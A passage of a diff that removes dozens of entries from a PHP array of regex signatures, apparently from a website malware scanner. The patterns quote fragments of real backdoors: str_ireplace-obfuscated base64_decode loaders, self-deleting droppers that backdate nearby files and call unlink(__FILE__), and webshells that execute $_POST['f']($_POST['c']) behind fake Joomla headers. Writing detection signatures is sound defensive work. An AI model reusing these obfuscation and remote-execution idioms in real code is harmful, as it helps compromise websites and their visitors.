-      'pattern' => '/\\<\\?php \\$qqquthpgv\\=str_ireplace\\("q","","qqbqqqqqqaqqqsqqqqeqqqqq6qqqqq4qqqq_qqdqqqqqeqqqqqcqqqoqqdqqeq"\\); \\$wfpzqr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    226 => 
-    array (
-      'pattern' => '/\\<\\?php echo "fSwxuctTqY"; if \\(file_exists\\("\\.\\/playlist\\.php"\\)\\)\\{ touch\\("\\.\\/playlist\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*mraPAgxW3/',
-      'label' => 'source-file tail snippet',
-    ),
-    227 => 
-    array (
-      'pattern' => '/\\<\\?php \\$esrgvrmrs\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$rfskvq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    228 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gvefnmeav\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$qrehkx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    229 => 
-    array (
-      'pattern' => '/\\<\\?php \\$hpzvftf\\=str_ireplace\\("g","","gggbgggggagggggsggggegggggg6gggg4gggg_ggggdggggeggggcggoggggggdggggeg"\\); \\$zzqeb\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    230 => 
-    array (
-      'pattern' => '/\\<\\?php \\$tscdxbhvc\\=str_ireplace\\("i","","ibiiiiiaiiiisiiiiiieiiiii6iii4iii_iiiidiieiiiciiioiiiiidiiiiieii"\\); \\$ggwxqsz\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    231 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mcfrswnzud\\=str_ireplace\\("m","","mmmbmmmmmammmsmmmemmmm6mmm4mmm_mmmdmmmmemmmmcmmmmommmmdmmmmem"\\); \\$kwtcrpd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    232 => 
-    array (
-      'pattern' => '/\\<\\?php \\$zbznc\\=str_ireplace\\("p","","pbppppappspppeppppp6pppp4ppppp_pppppdppppepppppcpppopppdpppppeppp"\\); \\$ffdytmh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    233 => 
-    array (
-      'pattern' => '/\\<\\?php echo "qUcKcmfxwm"; if \\(file_exists\\("\\.\\/newsletters\\.php"\\)\\)\\{ touch\\("\\.\\/newsletters\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*kVg/',
-      'label' => 'source-file tail snippet',
-    ),
-    234 => 
-    array (
-      'pattern' => '/\\/rest\\-api\\/endpoints\\/class\\-wp\\-rest\\-attachments\\-controller\\.php[\\s\\S]{0,160}\\/rest\\-api\\/endpoints\\/class\\-wp\\-rest\\-post\\-types\\-controller\\.php/',
-      'label' => 'sample-specific literal chain',
-    ),
-    235 => 
-    array (
-      'pattern' => '/LypkZ2d0enR0cmdzcnZ2Ki8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    236 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mmgewy\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$mguqccxxrs\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    237 => 
-    array (
-      'pattern' => '/rsd\'\\] \\) \\) \\{ \\/\\/ http\\:\\/\\/cyber\\.law\\.harvard\\.edu\\/blogs\\/gems\\/tech\\/rsd\\.html
-	header\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    238 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yqhtxrwhan\\=str_ireplace\\("f","","ffbfffffaffffsfffeffff6ffffff4ffff_ffdfffffeffffcfffffoffffdffffefff"\\); \\$gudqdk\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    239 => 
-    array (
-      'pattern' => '/\\<\\?php echo "pssVDrkyCu"; if \\(file_exists\\("\\.\\/editgames\\.php"\\)\\)\\{ touch\\("\\.\\/editgames\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*URFvSHu/',
-      'label' => 'source-file tail snippet',
-    ),
-    240 => 
-    array (
-      'pattern' => '/\\<\\?php \\$tvkusuckzz\\=str_ireplace\\("r","","rbrrrrarrrrrsrrerrrrrr6rrrr4rrrr_rrrrrdrrrerrrrrcrrrrrorrrdrrrerrr"\\); \\$mznxrtd\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    241 => 
-    array (
-      'pattern' => '/LypubW51enlyd2ZndnhoKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    242 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wgguv\\=str_ireplace\\("y","","ybyyyyayyyysyyyyeyyy6yyyyy4yyy_yyyydyyeyyyycyyoyyyydyyyyyey"\\); \\$eumbwze\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/',
-      'label' => 'source-file tail snippet',
-    ),
-    243 => 
-    array (
-      'pattern' => '/LypiZ3ByZ3ZiYnhxd2JueWgqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    244 => 
-    array (
-      'pattern' => '/\\<\\?php echo "puTtDAmceG"; if \\(file_exists\\("\\.\\/orderhistory\\.php"\\)\\)\\{ touch\\("\\.\\/orderhistory\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*c/',
-      'label' => 'source-file tail snippet',
-    ),
-    245 => 
-    array (
-      'pattern' => '/\\] \\);
-	\\$tb_id \\= intval\\( \\$tb_id\\[ count\\( \\$tb_id \\) \\- 1 \\] \\);
-\\}
-
-\\$tb_url  \\= isset\\( \\$_POST\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    246 => 
-    array (
-      'pattern' => '/\\<\\?php \\$hqceegmgfv\\=str_ireplace\\("n","","nnnbnnnnnannnnsnnnnennnn6nnn4nn_nnnndnnennnncnnnonnnnndnnnnenn"\\); \\$ghxuhs\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    247 => 
-    array (
-      'pattern' => '/\\<\\?php echo "SbAKxpksph"; if \\(file_exists\\("\\.\\/search_config\\.php"\\)\\)\\{ touch\\("\\.\\/search_config\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\//',
-      'label' => 'source-file tail snippet',
-    ),
-    248 => 
-    array (
-      'pattern' => '/\\);\\$butymx\\=\\$bwpxct\\(\\$bkywhxvrgcnhat\\);user_error\\(\\$butymx,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    249 => 
-    array (
-      'pattern' => '/\\<\\?php \\$xxwqptnq\\=str_ireplace\\("x","","xbxxaxxxxsxxxxxexxxx6xxx4xxx_xxxxxdxxxxxexxxxxcxxxxoxxxxxdxxxexx"\\); \\$znkstzc\\="DQoJCUBlcnJvcl9yZXBvcnRpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    250 => 
-    array (
-      'pattern' => '/\\* @copyright  Copyright \\(C\\) 2005 \\- 2016 Open Source Matters, Inc\\. All rights reserved\\.[\\s\\S]{0,12000}array_map                 \\(\'a\', array      \\(\\$_POST\\[\'f\'\\]                     \\(         \\$_POST\\[\'c\'\\]\\)                       \\)\\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    251 => 
-    array (
-      'pattern' => '/\\<\\?php \\$asbeerz\\=str_ireplace\\("h","","hbhhhahhhhshhhehhhhh6hhhhh4hhhhh_hhdhhhhehhhhhchhhhhohhhhdhhhhheh"\\); \\$yrwwhpxusu\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    252 => 
-    array (
-      'pattern' => '/\\* @package    Error Libraries[\\s\\S]{0,12000}trigger_error         \\(        \\$win_error, E_USER_ERROR\\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    253 => 
-    array (
-      'pattern' => '/\\<\\?php echo "QYGRCZZFde"; if \\(file_exists\\("\\.\\/chain\\.func\\.php"\\)\\)\\{ touch\\("\\.\\/chain\\.func\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*U7C2B/',
-      'label' => 'source-file tail snippet',
-    ),
-    254 => 
-    array (
-      'pattern' => '/\\<\\?php echo "hPFHqReVfZ"; if \\(file_exists\\("\\.\\/index\\-print\\.php"\\)\\)\\{ touch\\("\\.\\/index\\-print\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*Ut4/',
-      'label' => 'source-file tail snippet',
-    ),
-    255 => 
-    array (
-      'pattern' => '/\\<\\?php echo "qnDBaspVPB"; if \\(file_exists\\("\\.\\/chartaxd\\.php"\\)\\)\\{ touch\\("\\.\\/chartaxd\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*2QbBtdd7x/',
-      'label' => 'source-file tail snippet',
-    ),
-    256 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mkknfzbh\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$wptmqadpx\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBp/',
-      'label' => 'source-file tail snippet',
-    ),
-    257 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wtqdc\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$yksceweqxc\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    258 => 
-    array (
-      'pattern' => '/\\* @package    Error Libraries[\\s\\S]{0,12000}trigger_error                \\(       \\$win_error, E_USER_ERROR\\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    259 => 
-    array (
-      'pattern' => '/\\<\\?php echo "RKPmBVdPyb"; if \\(file_exists\\("\\.\\/orderterms\\.php"\\)\\)\\{ touch\\("\\.\\/orderterms\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*1Sbvn/',
-      'label' => 'source-file tail snippet',
-    ),
-    260 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ecddgtv\\=str_ireplace\\("p","","pbppppappppsppppepppppp6ppp4ppppp_pppdpppppepppcpppopppppdppppepp"\\); \\$vanbprznm\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    261 => 
-    array (
-      'pattern' => '/Lyp2emF3cG5xd2FidnhueWQqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    262 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vdgdwbbfz\\=str_ireplace\\("x","","xbxxxaxxsxxxexxx6xxxxxx4xxxx_xxxxdxxxxxexxxxxcxxxxxxoxxxxxdxxxxexx"\\); \\$dvzrvfeeyy\\="DQoJCUBlcnJvcl9yZXB/',
-      'label' => 'source-file tail snippet',
-    ),
-    263 => 
-    array (
-      'pattern' => '/\\<\\?php \\$khezmpvsb\\=str_ireplace\\("x","","xbxxxxxaxxxxsxxxxexxxx6xxx4xxxxxx_xxxxxdxxexxxxcxxxoxxxxdxxxxex"\\); \\$daseqzdt\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    264 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mkdcfd\\=str_ireplace\\("f","","ffbfffffaffffsfffeffff6ffffff4ffff_ffdfffffeffffcfffffoffffdffffefff"\\); \\$zfyrkwwf\\="DQoJCUBlcnJvcl9yZXBvcn/',
-      'label' => 'source-file tail snippet',
-    ),
-    265 => 
-    array (
-      'pattern' => '/\\<\\?php echo "AhvysprEPs"; if \\(file_exists\\("\\.\\/refinesearch\\.php"\\)\\)\\{ touch\\("\\.\\/refinesearch\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*F/',
-      'label' => 'source-file tail snippet',
-    ),
-    266 => 
-    array (
-      'pattern' => '/\\<\\?php \\$cbwsrxemp\\=str_ireplace\\("i","","iibiiiiaiisiiieiii6iiii4iiiii_iiiiiidiiiieiiciiiioiiiidiiieiii"\\); \\$nemwpds\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    267 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wyvbcq\\=str_ireplace\\("i","","iibiiiiiiaiiisiiieiiiii6iiii4iiiii_iiiidiiieiiiiciiioiiiidiiiieii"\\); \\$xmdvvskpe\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    268 => 
-    array (
-      'pattern' => '/LyprdGR6eSovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKm5jemhm/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    269 => 
-    array (
-      'pattern' => '/\\<\\?php \\$kxfptxy\\=str_ireplace\\("z","","zzzbzzzzazzzzszzzzezzzz6zzzzzz4zz_zzzzzdzzzezzzzzczzzzzzozzzzdzzezzz"\\); \\$smbpza\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    270 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}array_map                         \\(\'a\', array                            \\(\\$_POST\\[\'f\'\\]            \\(     \\$_POST\\[\'c\'\\]\\)                    \\)\\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    271 => 
-    array (
-      'pattern' => '/LypzYnl0bWd2ZmdheHJwYiovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0p/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    272 => 
-    array (
-      'pattern' => '/\\<\\?php \\$vrmztf\\=str_ireplace\\("t","","tttbttttttattttstttettttt6tttt4tttt_ttttdttettttttcttottttdttet"\\); \\$yrxusbv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    273 => 
-    array (
-      'pattern' => '/\\<\\?php \\$eeyrhfxdfb\\=str_ireplace\\("w","","wwwbwwwwawwwswwwewwwwww6www4www_wwwwdwwwwwwewwwwwcwwwwowwwdwwwweww"\\); \\$mvqzu\\="DQoJCUBlcnJvcl9yZXBvcnR/',
-      'label' => 'source-file tail snippet',
-    ),
-    274 => 
-    array (
-      'pattern' => '/\\* @package    Error Libraries[\\s\\S]{0,12000}trigger_error         \\(                \\$win_error, E_USER_ERROR\\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    275 => 
-    array (
-      'pattern' => '/Lypha2NtdG11eHltem53dHEqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJd/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    276 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dbazzqkrms\\=str_ireplace\\("z","","zzzbzzzazzzzzzszzzzzezzzzzz6zzzzz4zzzz_zzzzdzzzezzzczzzzozzzdzzzzzezz"\\); \\$uksubmu\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    277 => 
-    array (
-      'pattern' => '/\\<\\?php \\$yxghhtbv\\=str_ireplace\\("h","","hhbhhahhhhshhhhhehhh6hhhh4hhhh_hhhhhdhhhehhhhhchhohhhhhhdhhhehhh"\\); \\$wzszfrqx\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    278 => 
-    array (
-      'pattern' => '/\\<\\?php \\$kqzqt\\=str_ireplace\\("x","","xbxxxxxaxxxxsxxxxexxxx6xxx4xxxxxx_xxxxxdxxexxxxcxxxoxxxxdxxxxex"\\); \\$uhygkmgd\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    279 => 
-    array (
-      'pattern' => '/\\<\\?php echo "NYRdmqumWG"; if \\(file_exists\\("\\.\\/fog\\.conf\\.php"\\)\\)\\{ touch\\("\\.\\/fog\\.conf\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*gcXdB7SMK/',
-      'label' => 'source-file tail snippet',
-    ),
-    280 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bwgksyvx\\=str_ireplace\\("h","","hbhhahhhhhshhhhhehhh6hhhh4hhhh_hhhhdhhhehhhchhhohhhhdhhhhehh"\\); \\$ebgdpprxq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    281 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ksmbansch\\=str_ireplace\\("w","","wwwbwwwwwawwwswwwwewwww6wwww4wwwww_wwwwwdwwwwwewwcwwwwwowwwdwwwwwwew"\\); \\$ehbphba\\="DQoJCUBlcnJvcl9yZXBv/',
-      'label' => 'source-file tail snippet',
-    ),
-    282 => 
-    array (
-      'pattern' => '/\\<\\?php \\$drxhystxe\\=str_ireplace\\("r","","rrrbrrrarrsrrrerr6rrrrrr4rrr_rrrdrrrrrrerrrrrcrrrrorrrdrrrrer"\\); \\$ckpgyfmmqr\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    283 => 
-    array (
-      'pattern' => '/\\<\\?php echo "GaHVZMFMVf"; if \\(file_exists\\("\\.\\/write\\-review\\.php"\\)\\)\\{ touch\\("\\.\\/write\\-review\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*u/',
-      'label' => 'source-file tail snippet',
-    ),
-    284 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wvzhqege\\=str_ireplace\\("h","","hhhbhhhhahhhshhhehhh6hhhh4hhh_hhhdhhhhehhhhchhhhhohhhhdhhhhheh"\\); \\$ufatzzcb\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    285 => 
-    array (
-      'pattern' => '/\\);\\$vhsbp\\=\\$brz\\(\\$wdzsktscyhhr\\);user_error\\(\\$vhsbp,E_USER_ERROR\\);
-
-\\/\\/ Set the root path as a constant\\.
-if \\(\\!defined\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    286 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply\\(\\$option, \\$win,                    array            \\(\\$it\\)  \\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    287 => 
-    array (
-      'pattern' => '/\\<\\?php \\$sfpkstz\\=str_ireplace\\("m","","mmmbmmammmmsmmemmm6mmmmmm4mmmm_mmmmdmmmmmmemmmmmcmmmommmmdmmmmmmem"\\); \\$eeeqsam\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    288 => 
-    array (
-      'pattern' => '/\\<\\?php echo "UaNUYaBEPr"; if \\(file_exists\\("\\.\\/config\\.serious\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.serious\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\);/',
-      'label' => 'source-file tail snippet',
-    ),
-    289 => 
-    array (
-      'pattern' => '/\\<\\?php \\$bvaknw\\=str_ireplace\\("w","","wwbwwwwwwawwwwwswwewwww6wwwww4wwwww_wwwwwdwwewwwwwcwwwwwowwwwdwwwwew"\\); \\$qbfufeegv\\="DQoJCUBlcnJvcl9yZXBvc/',
-      'label' => 'source-file tail snippet',
-    ),
-    290 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}usort            \\( \\$b, \\$a                          \\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    291 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gsmfrtg\\=str_ireplace\\("z","","zbzzzzazzzzszzzzezzzz6zzz4zzz_zzzdzzzzezzzzczzzzozzzdzzzzzzezz"\\); \\$rcpszueb\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    292 => 
-    array (
-      'pattern' => '/\\<\\?php \\$ewqhz\\=str_ireplace\\("t","","tttbttttttattttstttettttt6tttt4tttt_ttttdttettttttcttottttdttet"\\); \\$ahuyvekagd\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    293 => 
-    array (
-      'pattern' => '/\\<\\?php \\$sbqmqhmy\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$bqkrgmpr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpb/',
-      'label' => 'source-file tail snippet',
-    ),
-    294 => 
-    array (
-      'pattern' => '/\\<\\?php \\$qufvgymnkf\\=str_ireplace\\("m","","mmbmmmmmammmmmmsmmmemmmmmm6mmm4mmmm_mmdmmmmmemmmmmcmmmommmmdmmemmm"\\); \\$braratrmqu\\="DQoJCUBlcnJvcl9yZX/',
-      'label' => 'source-file tail snippet',
-    ),
-    295 => 
-    array (
-      'pattern' => '/\\<\\?php echo "rxUQDaqxMU"; if \\(file_exists\\("\\.\\/locator\\.php"\\)\\)\\{ touch\\("\\.\\/locator\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*3\\)\\); \\} unlink\\(__FILE__\\); \\/\\*73K565h5awc/',
-      'label' => 'source-file tail snippet',
-    ),
-    296 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gbannq\\=str_ireplace\\("u","","uuubuuuuauuuusuuuueuuuuuu6uuuu4uuuu_uuuuduuuueuuuucuuuouuuuuduuueu"\\); \\$qfvxv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/',
-      'label' => 'source-file tail snippet',
-    ),
-    297 => 
-    array (
-      'pattern' => '/LypldnFmZHEqLyBpZiAoIWVtcHR5KCRfR0VUKSAmJiBpc3NldCgkX0dFVFsibW9kZSJdKSl7Lypobm15/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    298 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gsxnshpzzt\\=str_ireplace\\("p","","pbppppappppsppppepppp6pppp4pp_ppdpppppepppcppoppdppppppep"\\); \\$ywzkbswt\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoM/',
-      'label' => 'source-file tail snippet',
-    ),
-    299 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wmxmcngn\\=str_ireplace\\("x","","xxxbxxxxxxaxxxxsxxxxxexxxx6xxxx4xxxxx_xxxxdxxxexxxxcxxxoxxxxdxxxex"\\); \\$hwfkwy\\="DQoJCUBlcnJvcl9yZXBvcnRp/',
-      'label' => 'source-file tail snippet',
-    ),
-    300 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply                 \\(\\$option, \\$win,            array                           \\(\\$it\\)                    \\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    301 => 
-    array (
-      'pattern' => '/\\<\\?php echo "EVzGkVNksa"; if \\(file_exists\\("\\.\\/config\\.angle\\.php"\\)\\)\\{ touch\\("\\.\\/config\\.angle\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*2\\)\\); \\} unlink\\(__FILE__\\); \\/\\*u/',
-      'label' => 'source-file tail snippet',
-    ),
-    302 => 
-    array (
-      'pattern' => '/\\<\\?php \\$mezrtt\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$stskhr\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc/',
-      'label' => 'source-file tail snippet',
-    ),
-    303 => 
-    array (
-      'pattern' => '/\\<\\?php \\$wxgrkt\\=str_ireplace\\("z","","zzzbzzazzzzzszzzzzezzzzz6zzz4zzz_zzdzzzezzzczzzzozzzzzdzzzezzz"\\); \\$uyxkp\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    304 => 
-    array (
-      'pattern' => '/\\<\\?php \\$uechxztts\\=str_ireplace\\("f","","fbfffafffffsffffeff6ff4ff_ffdfffefffffcfffoffffdfffeff"\\); \\$wqzsyudhce\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk/',
-      'label' => 'source-file tail snippet',
-    ),
-    305 => 
-    array (
-      'pattern' => '/\\<\\?php \\$gpykd\\=str_ireplace\\("g","","gggbggggaggggsgggggeggggg6gggg4gg_gggggdggggeggggggcggggogggdggeg"\\); \\$cdbxazpn\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/',
-      'label' => 'source-file tail snippet',
-    ),
-    306 => 
-    array (
-      'pattern' => '/\\<\\?php \\$dcvresgn\\=str_ireplace\\("m","","mmmbmmmmmammmsmmmemmmm6mmm4mmm_mmmdmmmmemmmmcmmmmommmmdmmmmem"\\); \\$mpwmh\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMC/',
-      'label' => 'source-file tail snippet',
-    ),
-    307 => 
-    array (
-      'pattern' => '/LyptaHRxYmVxdyovIGlmICghZW1wdHkoJF9HRVQpICYmIGlzc2V0KCRfR0VUWyJtb2RlIl0pKXsvKnB6/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    308 => 
-    array (
-      'pattern' => '/\\<\\?php \\$rwfzhnz\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$evxayg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlf/',
-      'label' => 'source-file tail snippet',
-    ),
-    309 => 
-    array (
-      'pattern' => '/\\<\\?php \\$fexqx\\=str_ireplace\\("f","","ffbffaffffsffffffefffff6ffff4fff_ffffdffffeffcffffoffffdfffffefff"\\); \\$dvaegz\\="DQoJCUBlcnJvcl9yZXBvcnRpbmco/',
-      'label' => 'source-file tail snippet',
-    ),
-    310 => 
-    array (
-      'pattern' => '/Lyp0YWJibnJudmdjZ3RhKi8gaWYgKCFlbXB0eSgkX0dFVCkgJiYgaXNzZXQoJF9HRVRbIm1vZGUiXSkp/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    311 => 
-    array (
